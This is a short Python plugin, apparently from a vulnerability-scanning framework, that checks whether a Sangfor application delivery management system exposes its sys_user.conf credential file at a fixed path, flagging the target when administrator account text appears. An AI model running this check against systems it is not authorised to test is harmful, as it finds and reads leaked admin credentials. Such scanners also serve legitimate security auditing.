#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20sys_user.conf%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/tmp/updateme/sinfor/ad/sys/sys_user.conf"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "admin" in res.text and "管理员账户" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret